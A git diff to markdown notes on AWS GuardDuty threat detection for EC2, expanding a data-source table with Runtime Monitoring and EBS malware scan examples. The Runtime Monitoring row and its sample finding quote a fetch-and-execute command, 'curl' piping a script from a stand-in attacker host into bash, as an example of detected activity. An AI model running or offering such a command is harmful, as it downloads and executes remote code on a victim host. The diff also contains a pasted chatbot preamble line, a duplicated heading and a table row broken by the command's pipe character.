@@ -430,15 +430,59 @@ aws guardduty create-sample-findings --detector-id <your-detector-id>
 # EC2 Protection
 ## 1. GuardDuty Checks for EC2
 GuardDuty analyzes three primary data sources (plus optional features) to detect threats affecting EC2 instances:
+Here’s the **updated “GuardDuty Checks for EC2”** section, now including **Runtime Monitoring** and **EBS Volume Scans**, with what each captures and an EC2‑focused threat example.
 
-| Data Source               | What It Captures                                                     | Example EC2‑Related Threats                                              |
-| ------------------------- | -------------------------------------------------------------------- | ------------------------------------------------------------------------ |
-| **VPC Flow Logs**         | IP traffic in/out of ENIs attached to EC2 instances                  | Port scans, DDoS, data exfiltration over unexpected ports                |
-| **AWS CloudTrail (Mgmt)** | EC2 API calls (RunInstances, StopInstances, DescribeInstances, etc.) | Unauthorized API usage, creation of new instances via stolen credentials |
-| **DNS Query Logs**        | DNS lookups from EC2 (via Route 53 Resolver logs)                    | Communication with command‑and‑control domains, DNS tunneling            |
+---
 
-> **Optional Runtime Monitoring**
-> When enabled, GuardDuty also ingests OS‑level telemetry for EC2 (and containers) to detect suspicious processes, file changes, or shell activity.
+## 1. GuardDuty Checks for EC2
+
+GuardDuty analyzes these data sources (and optional features) to detect threats against your EC2 instances:
+
+| Data Source / Feature     | What It Captures                                                     | Example EC2‑Related Threat & Finding                                                                              |                                           |
+| ------------------------- | -------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- | ----------------------------------------- |
+| **VPC Flow Logs**         | Network traffic in/out of ENIs attached to EC2                       | **Portscan**: External host probing TCP ports (e.g., SSH port 22) Recon\:EC2/Portscan                           |                                           |
+| **CloudTrail Management** | EC2 API calls (RunInstances, StopInstances, DescribeInstances, etc.) | **Unauthorized Launch**: New instance spun up with stolen keys UnauthorizedAccess\:EC2/MaliciousIPCaller.Custom |                                           |
+| **DNS Query Logs**        | DNS lookups originating from EC2 (via Route 53 Resolver)             | **C2 Communication**: Instance resolving a known malware domain Backdoor\:EC2/C\&CActivity.B!DNS                |                                           |
+| **Runtime Monitoring** ⭐️ | OS‑level telemetry: process creation, file writes, shell commands    | **Reverse Shell**: Detected command \`curl [http://evil.com/shell.sh](http://evil.com/shell.sh)                   | bash\` Behavior\:EC2/NetworkPortUnusual |
+| **EBS Volume Scans** ⭐️   | Agentless malware signature scans on EBS snapshots                   | **Disk‑Based Trojan**: Malware signature found in attached volume snapshot Malware\:EC2/MalwareSignatureMatch   |                                           |
+
+> ⭐️ *Optional features you must explicitly enable under GuardDuty “Additional Features”.*
+
+<details>
+  <summary>Example</summary>
+
+1. **Runtime Monitoring**
+
+   * **Processes & Commands**: Tracks execution of binaries, unusual shell commands, scripting activity.
+   * **File Events**: Detects unexpected file creations, permissions changes, or script drops.
+   * **Threat Example**:
+
+     * Finding:
+
+       ```json
+       {
+         "findingType": "Behavior:EC2/NetworkPortUnusual",
+         "description": "Suspicious command execution detected: curl http://evil.com/shell.sh | bash"
+       }
+       ```
+
+2. **EBS Volume Scans**
+
+   * **Malware Signatures**: Scans snapshots of attached EBS volumes for known virus or trojan signatures.
+   * **Snapshot Analysis**: GuardDuty creates a point‑in‑time snapshot, scans it agentlessly, then deletes it.
+   * **Threat Example**:
+
+     * Finding:
+
+       ```json
+       {
+         "findingType": "Malware:EC2/MalwareSignatureMatch",
+         "description": "EBS snapshot of volume vol-0123456789abcdef contains known Trojan: Win.Trojan.XYZ"
+       }
+       ```
+
+</details>
+
 
 ## 2. Enabling GuardDuty for EC2
 <details>
